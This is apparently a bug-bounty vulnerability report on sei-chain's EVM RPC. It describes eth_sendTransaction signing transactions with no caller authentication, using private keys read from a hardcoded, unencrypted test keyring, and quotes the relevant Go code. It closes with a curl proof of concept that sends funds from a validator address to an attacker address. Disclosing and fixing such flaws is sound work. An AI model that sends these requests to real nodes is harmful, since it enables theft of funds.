### Title
Unauthenticated `eth_sendTransaction` Signs Transactions Using Node's Unencrypted Test Keyring — (`evmrpc/send.go`, `evmrpc/utils.go`)

---

### Summary

The EVM RPC server exposes `eth_sendTransaction` (and `eth_signTransaction`) endpoints that sign and broadcast transactions using the node's local keys with **no caller authentication**. The signing path hardcodes `keyring.BackendTest`, which stores private keys **unencrypted** on disk. Any unprivileged network peer that can reach the EVM RPC port can drain funds from any address whose key is present in the node's test keyring.

---

### Finding Description

`SendTransaction` and `SignTransaction` in `evmrpc/send.go` delegate to the internal helper `signTransaction`: [1](#0-0) 

```go
func (s *SendAPI) signTransaction(unsignedTx *ethtypes.Transaction, from string) (*ethtypes.Transaction, error) {
    kb, err := getTestKeyring(s.homeDir)
    ...
    privKey, ok := getAddressPrivKeyMap(kb)[from]
    ...
    return ethtypes.SignTx(unsignedTx, signer, privKey)
}
```

`getTestKeyring` **hardcodes** `keyring.BackendTest`: [2](#0-1) 

`BackendTest` is an unencrypted, password-free keyring backend: [3](#0-2) 

`getAddressPrivKeyMap` then iterates every key in that keyring, reads `localInfo.PrivKeyArmor` in plaintext, and returns a `map[evmAddress]*ecdsa.PrivateKey`: [4](#0-3) 

The caller of `eth_sendTransaction` only needs to supply a `from` field matching any address in the test keyring. No password, token, or session is checked anywhere in this path.

`eth_signTransaction` is confirmed disabled (returns `-32601`): [5](#0-4) 

`eth_sendTransaction` (`SendTransaction`) has no equivalent guard and is fully implemented.

---

### Impact Explanation

An attacker with network access to the EVM RPC port (default `:8545`) can:

1. Call `eth_sendTransaction` with `from` set to any address whose key is in the node's test keyring (validator hot-wallet, operator account, etc.).
2. The server signs the transaction with that key and broadcasts it — **no authentication required**.
3. Funds can be transferred to an attacker-controlled address.

If the node holds a validator hot-wallet or fee-collection address with significant balance, this maps to **unauthorized transfer ≥ $5k** (Critical in Sei's bounty scope).

---

### Likelihood Explanation

- `BackendTest` is the default keyring for automated/CI validator setups and is widely used in Sei node deployments.
- The EVM RPC port is often publicly exposed for dApp connectivity.
- The attacker only needs to enumerate addresses (trivially done via `eth_accounts` or on-chain data) and call one JSON-RPC method.
- No special privilege, leaked key, or governance access is required — purely unprivileged network access.

---

### Recommendation

1. **Remove `eth_sendTransaction` / `eth_signTransaction` from the public RPC surface**, or gate them behind an explicit opt-in flag (as Geth does with `--unlock`).
2. **Never hardcode `BackendTest`** in production server code. Use the keyring backend configured by the operator (`BackendOS`, `BackendFile`, etc.) so keys are encrypted at rest and require a passphrase to unlock.
3. If hosted signing is intentionally supported, require an authenticated session (e.g., JWT, Unix-socket-only exposure) before any signing operation.

---

### Proof of Concept

```bash
# 1. Enumerate addresses with keys in the test keyring (or read from chain)
curl -s http://<node>:8545 \
  -d '{"jsonrpc":"2.0","method":"eth_accounts","params":[],"id":1}'
# Returns: ["0xVALIDATOR_ADDR", ...]

# 2. Send funds to attacker without any authentication
curl -s http://<node>:8545 \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc":"2.0","method":"eth_sendTransaction",
    "params":[{
      "from":  "0xVALIDATOR_ADDR",
      "to":    "0xATTACKER_ADDR",
      "value": "0xDE0B6B3A7640000"
    }],
    "id":1
  }'
# Server signs with the validator's unencrypted key and broadcasts the tx.
```

The root cause is entirely within sei-chain: `evmrpc/send.go` (`SendTransaction` → `signTransaction`) and `evmrpc/utils.go` (`getTestKeyring` hardcoding `BackendTest`, `getAddressPrivKeyMap` extracting raw private keys).

```go
func getAddressPrivKeyMap(kb keyring.Keyring) map[string]*ecdsa.PrivateKey {
	res := map[string]*ecdsa.PrivateKey{}
	keys, err := kb.List()
	if err != nil {
		return res
	}
	for _, key := range keys {
		localInfo, ok := key.(keyring.LocalInfo)
		if !ok {
			// will only show local key
			continue
		}
		if localInfo.GetAlgo() != hd.Secp256k1Type {
			fmt.Printf("Skipping address %s because it isn't signed with secp256k1\n", localInfo.Name)
			continue
		}
		priv, err := legacy.PrivKeyFromBytes([]byte(localInfo.PrivKeyArmor))
		if err != nil {
			continue
		}
		privHex := hex.EncodeToString(priv.Bytes())
		privKey, err := crypto.HexToECDSA(privHex)
		if err != nil {
			continue
		}
		address := crypto.PubkeyToAddress(privKey.PublicKey)
		res[address.Hex()] = privKey
	}
	return res
}
```
